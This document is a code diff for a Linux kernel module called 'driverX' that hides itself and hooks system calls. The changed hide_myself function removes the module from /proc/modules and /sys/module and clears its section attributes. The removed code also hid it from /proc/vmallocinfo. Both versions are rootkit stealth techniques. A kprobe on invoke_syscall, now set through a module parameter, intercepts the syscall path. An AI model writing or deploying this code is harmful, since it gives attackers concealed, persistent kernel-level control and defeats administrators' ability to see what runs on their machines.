@@ -22,7 +22,7 @@
 #include <linux/list.h>
 #include <linux/slab.h>
 #include <linux/sysfs.h>
-
+/*
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
@@ -30,52 +30,45 @@ static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name",
 };
 #endif
+*/
+static char *mCommon = "invoke_syscall";
 
-static void __init hide_myself(void)
-{
-    struct vmap_area *va, *vtmp;
-    struct module_use *use, *tmp;
-    struct list_head *_vmap_area_list;
-    struct rb_root *_vmap_area_root;
+module_param(mCommon, charp, 0644);
+MODULE_PARM_DESC(mCommon, "Parameter");
 
-#ifdef KPROBE_LOOKUP
-    unsigned long (*kallsyms_lookup_name)(const char *name);
-    if (register_kprobe(&kp) < 0) {
-	printk("driverX: module hide failed");
+static struct list_head *module_prev;         // Store previous module position
+static struct kobject *kobject_prev;          // Store previous kobject
+static struct kobject *kobject_parent_prev;   // Store parent kobject
+static struct module_sect_attrs *sect_attrs_bkp;
+static struct module_notes_attrs *notes_attrs_bkp;
+static int module_hidden = 0;                 // Flag for module state
+
+void hide_myself(void) {
+    if (module_hidden) // If already hidden, return
         return;
-    }
-    kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
-    unregister_kprobe(&kp);
-#endif
 
-    _vmap_area_list =
-        (struct list_head *) kallsyms_lookup_name("vmap_area_list");
-    _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
+    // Store the module’s original list position and kobject references
+    module_prev = THIS_MODULE->list.prev;
+    kobject_prev = &THIS_MODULE->mkobj.kobj;
+    kobject_parent_prev = THIS_MODULE->mkobj.kobj.parent;
 
-    /* hidden from /proc/vmallocinfo */
-    list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
-        if ((unsigned long) THIS_MODULE > va->va_start &&
-            (unsigned long) THIS_MODULE < va->va_end) {
-            list_del(&va->list);
-            /* remove from red-black tree */
-            rb_erase(&va->rb_node, _vmap_area_root);
-        }
-    }
+    // Backup section and notes attributes
+    sect_attrs_bkp = THIS_MODULE->sect_attrs;
+    notes_attrs_bkp = THIS_MODULE->notes_attrs;
 
-    /* hidden from /proc/modules */
-    list_del_init(&THIS_MODULE->list);
+    // Remove from /proc/modules
+    list_del(&THIS_MODULE->list);
 
-    /* hidden from /sys/modules */
+    // Remove from /sys/module
     kobject_del(&THIS_MODULE->mkobj.kobj);
+    /* if (THIS_MODULE->holders_dir) {
+        kobject_del(THIS_MODULE->holders_dir); // Remove module's holders directory if it exists
+    } */
+    // Nullify attributes to prevent crashes on access
+    THIS_MODULE->sect_attrs = NULL;
+    THIS_MODULE->notes_attrs = NULL;
 
-    /* decouple the dependency */
-    list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list,
-                              target_list) {
-        list_del(&use->source_list);
-        list_del(&use->target_list);
-        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
-        kfree(use);
-    }
+    module_hidden = (unsigned int)0x1;; // Mark module as hidden
 }
 
 int dispatch_open(struct inode *node, struct file *file) {
@@ -230,12 +223,12 @@ static int __init hide_init(void)
 {
     int ret;
     // kpp.symbol_name = "el0_svc_common";
-    kpp.symbol_name = "invoke_syscall";
+    kpp.symbol_name = mCommon; // "invoke_syscall";
     kpp.pre_handler = handler_pre;
 
     ret = register_kprobe(&kpp);
     if (ret < 0) {
-        pr_err("driverX: Failed to register kprobe: %d\n", ret);
+        pr_err("driverX: Failed to register kprobe: %d (%s)\n", ret, kpp.symbol_name);
         return ret;
     }
     
